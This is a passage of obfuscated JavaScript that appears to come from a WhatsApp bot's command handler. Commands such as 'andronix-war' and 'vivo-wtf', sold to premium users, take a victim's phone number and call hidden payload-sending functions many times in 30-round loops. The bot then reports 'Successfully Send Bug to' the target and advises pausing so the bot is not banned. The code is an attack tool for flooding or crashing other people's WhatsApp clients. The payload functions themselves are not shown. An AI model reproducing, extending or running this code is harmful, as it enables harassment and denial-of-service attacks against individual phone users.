            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x28a511(_0x316395);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x28a511(_0x316395);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4de787(_0x316395, _0x600e6e);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4de787(_0x316395, _0x600e6e);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4b4561(_0x316395, _0x600e6e);
            await _0x156efb(_0x316395, _0x3facec);
            await _0x4de787(_0x316395, _0x600e6e);
            await _0x4b4561(_0x316395, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x4db80f + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "network-just":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x34ab0e = q.replace(/[^0-9]/g, '');
          if (_0x34ab0e.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x3b05b3 = _0x34ab0e + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x80af7d = 0x0; _0x80af7d < 0x1e; _0x80af7d++) {
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x28a511(_0x3b05b3);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x28a511(_0x3b05b3);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x28a511(_0x3b05b3);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4de787(_0x3b05b3, _0x600e6e);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4de787(_0x3b05b3, _0x600e6e);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
            await _0x156efb(_0x3b05b3, _0x3facec);
            await _0x4de787(_0x3b05b3, _0x600e6e);
            await _0x4b4561(_0x3b05b3, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x34ab0e + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "andronix-fc":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x33308b = q.replace(/[^0-9]/g, '');
          if (_0x33308b.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x383872 = _0x33308b + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x1454f8 = 0x0; _0x1454f8 < 0x1e; _0x1454f8++) {
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x28a511(_0x383872);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x28a511(_0x383872);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x28a511(_0x383872);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4de787(_0x383872, _0x600e6e);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4de787(_0x383872, _0x600e6e);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4b4561(_0x383872, _0x600e6e);
            await _0x156efb(_0x383872, _0x3facec);
            await _0x4de787(_0x383872, _0x600e6e);
            await _0x4b4561(_0x383872, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x33308b + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "andronix-xyz":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x55b990 = q.replace(/[^0-9]/g, '');
          if (_0x55b990.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x207fae = _0x55b990 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x548246 = 0x0; _0x548246 < 0x1e; _0x548246++) {
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x28a511(_0x207fae);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x28a511(_0x207fae);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x28a511(_0x207fae);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4de787(_0x207fae, _0x600e6e);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4de787(_0x207fae, _0x600e6e);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4b4561(_0x207fae, _0x600e6e);
            await _0x156efb(_0x207fae, _0x3facec);
            await _0x4de787(_0x207fae, _0x600e6e);
            await _0x4b4561(_0x207fae, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x55b990 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "andronix-vrs":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x296652 = q.replace(/[^0-9]/g, '');
          if (_0x296652.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x23ac31 = _0x296652 + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x3bb3b0 = 0x0; _0x3bb3b0 < 0x1e; _0x3bb3b0++) {
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x28a511(_0x23ac31);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x28a511(_0x23ac31);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x28a511(_0x23ac31);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4de787(_0x23ac31, _0x600e6e);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4de787(_0x23ac31, _0x600e6e);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4b4561(_0x23ac31, _0x600e6e);
            await _0x156efb(_0x23ac31, _0x3facec);
            await _0x4de787(_0x23ac31, _0x600e6e);
            await _0x4b4561(_0x23ac31, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x296652 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "andronix-war":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1944b8 = q.replace(/[^0-9]/g, '');
          if (_0x1944b8.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x4edb63 = _0x1944b8 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x1fcb16 = 0x0; _0x1fcb16 < 0x1e; _0x1fcb16++) {
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x28a511(_0x4edb63);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x28a511(_0x4edb63);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x28a511(_0x4edb63);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4de787(_0x4edb63, _0x600e6e);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4de787(_0x4edb63, _0x600e6e);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4b4561(_0x4edb63, _0x600e6e);
            await _0x156efb(_0x4edb63, _0x3facec);
            await _0x4de787(_0x4edb63, _0x600e6e);
            await _0x4b4561(_0x4edb63, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x1944b8 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "vivo-wtf":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x26e134 = q.replace(/[^0-9]/g, '');
          if (_0x26e134.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x590c67 = _0x26e134 + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x1b581c = 0x0; _0x1b581c < 0x1e; _0x1b581c++) {
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x28a511(_0x590c67);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x28a511(_0x590c67);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x28a511(_0x590c67);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
            await _0x4b4561(_0x590c67, _0x600e6e);
            await _0x156efb(_0x590c67, _0x3facec);
